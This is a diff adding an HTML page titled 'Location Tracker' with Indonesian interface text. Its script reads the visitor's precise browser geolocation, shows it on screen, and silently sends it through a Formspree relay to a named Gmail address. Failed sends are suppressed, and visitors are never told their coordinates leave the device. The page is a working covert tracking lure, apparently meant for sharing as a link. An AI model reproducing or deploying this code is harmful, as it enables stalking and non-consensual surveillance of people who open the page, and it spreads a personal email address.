@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+<title>Location Tracker</title>
+<style>
+  body {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background: linear-gradient(135deg, #667eea, #764ba2);
+    color: white;
+    text-align: center;
+    padding: 1rem;
+  }
+  #status {
+    background: rgba(0,0,0,0.3);
+    padding: 1.5rem 2rem;
+    border-radius: 12px;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+    max-width: 320px;
+  }
+</style>
+</head>
+<body>
+  <div id="status">Fetching your location...</div>
+
+<script>
+(() => {
+  const statusEl = document.getElementById('status');
+
+  // Function to send location to backend email service
+  async function sendLocation(latitude, longitude) {
+    try {
+      // Using Formspree as email relay via fetch POST
+      await fetch('https://formspree.io/f/xoqrpljo', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          email: 'yhosi789@gmail.com',
+          subject: 'Lokasi Pengunjung',
+          message: `Pengunjung membuka website dengan lokasi:\nLatitude: ${latitude}\nLongitude: ${longitude}`
+        })
+      });
+    } catch (error) {
+      // Ignore errors to avoid breaking user experience
+    }
+  }
+
+  function success(position) {
+    const latitude  = position.coords.latitude.toFixed(6);
+    const longitude = position.coords.longitude.toFixed(6);
+    statusEl.textContent = `Lokasi Anda terdeteksi:\nLatitude: ${latitude}\nLongitude: ${longitude}`;
+    sendLocation(latitude, longitude);
+  }
+
+  function error(err) {
+    statusEl.textContent = 'Gagal mendapatkan lokasi. Pastikan izin lokasi diberikan.';
+  }
+
+  if (!navigator.geolocation) {
+    statusEl.textContent = 'Geolocation tidak didukung oleh browser ini.';
+  } else {
+    navigator.geolocation.getCurrentPosition(success, error, {
+      enableHighAccuracy: true,
+      timeout: 10000,
+      maximumAge: 0
+    });
+  }
+})();
+</script>
+</body>
+</html>
+
+```
